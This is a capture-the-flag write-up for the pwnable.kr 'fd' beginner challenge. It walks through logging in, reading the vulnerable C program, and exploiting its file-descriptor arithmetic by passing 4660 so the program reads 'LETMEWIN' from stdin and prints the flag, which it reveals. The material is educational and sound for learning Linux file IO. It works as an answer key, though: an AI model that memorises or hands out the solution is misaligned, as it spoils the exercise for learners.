# Toddler's Bottle

### Question

> Mommy! what is a file descriptor in Linux?
> 
> ssh fd@pwnable.kr -p2222 \(pw:guest\)

<button class="section" target="solution" show="Show solution" hide="Hide solution"></button>

<!--sec data-title="Solution" data-id="solution" data-show=false ces-->

### Step 1: SSH to the remote, and look around

```sh
$> ssh fd@pwnable.kr -p2222
fd@pwnable.kr\'s password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.smashthestack.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal

fd@ubuntu:~$ ls
fd  fd.c  flag

fd@ubuntu:~$ cat flag
cat: flag: Permission denied
```

We can see that we cannot read the flag (duh!) - Maybe the other file has something.


### Step 2: See what is inside other files

```bash
fd@ubuntu:~$ cat fd.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
            printf("pass argv[1] a number\n");
            return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
            printf("good job :)\n");
            system("/bin/cat flag");
            exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}

fd@ubuntu:~$

```

### Step 3: Get the flag

OK, `fd.c` MUST have access to the file! It expects an argument that will become a _file descriptor_. 
According to the [Linux MAN page](http://man7.org/linux/man-pages/man3/stdout.3.html), `STDIN` is associated with filedescriptor `0`. 
That means we have to make `fd=0` if we want to pass our input to the program.
If we use `0x1234` as an argument, `fd` would become `STDIN` and we can enter the password `LETMEWIN` :)

We call the `fd` program with argument 4660 (`0x1234` in decimal) and enter the `LETMEWIN` right after that:

```bash
fd@ubuntu:~$ ./fd `python -c "print 0x1234"` # This is equivalent to './fd 4660'
LETMEWIN
good job :)
mommy! I think I know what a file descriptor is!!
fd@ubuntu:~$
```

So the flag is `mommy! I think I know what a file descriptor is!!`
<!--endsec-->


